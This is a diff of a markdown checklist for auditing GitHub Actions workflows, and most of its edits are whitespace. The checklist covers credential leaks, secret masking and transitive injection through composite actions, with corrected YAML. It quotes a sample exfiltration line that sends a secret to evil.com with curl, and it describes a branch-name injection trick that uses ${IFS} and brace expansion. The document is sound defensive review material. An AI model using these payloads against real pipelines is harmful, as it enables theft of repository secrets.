@@ -1046,6 +1046,7 @@ code, which then runs with repository secrets.
 
 - [ ] **Artipacked** — `actions/checkout` with `persist-credentials: true` (default) leaks
       `.git/config` credentials in uploaded artifacts
+
   ```yaml
   # FIXED
   - uses: actions/checkout@v4
@@ -1077,19 +1078,23 @@ code, which then runs with repository secrets.
 
 - [ ] **Secret exfiltration** — `curl https://evil.com/${{ secrets.TOKEN }}` in workflow
 - [ ] **Secrets in artifacts** — uploaded artifacts contain `.env`, credentials, or hidden files
+
   ```yaml
   # FIXED — exclude hidden files
   - uses: actions/upload-artifact@v4
     with:
       include-hidden-files: false
   ```
+
 - [ ] **Unmasked secrets** — `fromJson()` derived values bypass GitHub's automatic masking
+
   ```yaml
   # FIXED — manually mask derived secrets
   run: |
     TOKEN=$(echo '${{ secrets.JSON_CREDS }}' | jq -r '.token')
     echo "::add-mask::$TOKEN"
   ```
+
 - [ ] **Excessive `secrets: inherit`** — reusable workflow call inherits all secrets when it only
       needs one
 - [ ] **Hardcoded credentials** — API keys, passwords, tokens directly in workflow YAML
@@ -1187,8 +1192,8 @@ shell context?
    GitHub user. `pull_request_target` is triggerable via fork PR. Check if there's an `if:`
    condition filtering by actor/association.
 2. **Direct vs transitive taint** — The workflow file itself may look safe. Cycode found Bazel's
-   $13K bug because `cherry-picker.yml` passed `${{ github.event.issue.title }}`via`with:` to a **composite action in another repo** (`bazelbuild/continuous-integration`). The composite action's `action.yml`had`run:
-   TITLE="${{ inputs.issue-title }}"`. Conventional scanners (actionlint) missed this because they don't follow `uses:`
+   $13K bug because `cherry-picker.yml` passed `${{ github.event.issue.title }}`via`with:`to a **composite action in another repo** (`bazelbuild/continuous-integration`). The composite action's`action.yml`had`run:
+   TITLE="${{ inputs.issue-title }}"`. Conventional scanners (actionlint) missed this because they don't follow`uses:`
    into external composite actions. **Always fetch and read the composite action's action.yml.**
 3. **Payload construction** — Branch names cannot contain spaces. Ultralytics YOLO attacker used
    `${IFS}` (Internal Field Separator) and Bash brace expansion `{curl,-sSfL,URL}` to bypass this.
